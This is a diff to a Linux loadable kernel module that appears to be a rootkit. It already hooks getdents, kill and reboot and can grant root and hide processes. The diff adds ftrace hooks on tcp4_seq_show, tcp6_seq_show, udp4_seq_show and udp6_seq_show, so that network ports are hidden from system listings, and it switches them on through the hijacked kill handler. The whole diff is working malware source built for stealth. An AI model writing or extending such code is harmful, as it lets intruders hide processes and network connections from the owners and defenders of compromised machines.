@@ -12,6 +12,7 @@
 #include "root_setter.h"
 #include "getdents_hacks.h"
 #include "hide_process.h"
+#include "hide_ports.h"
 
 
 MODULE_LICENSE("GPL");
@@ -36,7 +37,11 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("__x64_sys_getdents64", hack_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
     HOOK("__x64_sys_kill", hack_kill, &orig_kill),
-    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot)
+    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot),
+    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
+    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
+    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show)
 };
 #else
 static asmlinkage long hack_kill(pid_t pid, int sig);
@@ -44,7 +49,11 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
     HOOK("sys_getdents", hack_getdents, &orig_getdents),
     HOOK("sys_kill", hack_kill, &orig_kill),
-    HOOK("sys_reboot", hack_reboot, &orig_reboot)
+    HOOK("sys_reboot", hack_reboot, &orig_reboot),
+    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
+    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
+    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show)
 };
 #endif
 #ifdef PTREGS_SYSCALL_STUB
@@ -73,6 +82,18 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         }
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
+            printk(KERN_ERR "error hooking tcp4_seq_show\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp6_seq_show") == 1){
+            printk(KERN_ERR "error hooking tcp6_seq_show\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp4_seq_show") == 1){
+            printk(KERN_ERR "error hooking udp4_seq_show\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
+            printk(KERN_ERR "error hooking udp6_seq_show\n");
         }
         switch_hide_process();
     }
@@ -107,6 +128,19 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         }
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
+        }
+
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
+            printk(KERN_ERR "error hooking tcp4_seq_show\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp6_seq_show") == 1){
+            printk(KERN_ERR "error hooking tcp6_seq_show\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp4_seq_show") == 1){
+            printk(KERN_ERR "error hooking udp4_seq_show\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
+            printk(KERN_ERR "error hooking udp6_seq_show\n");
         }
         switch_hide_process();
     }
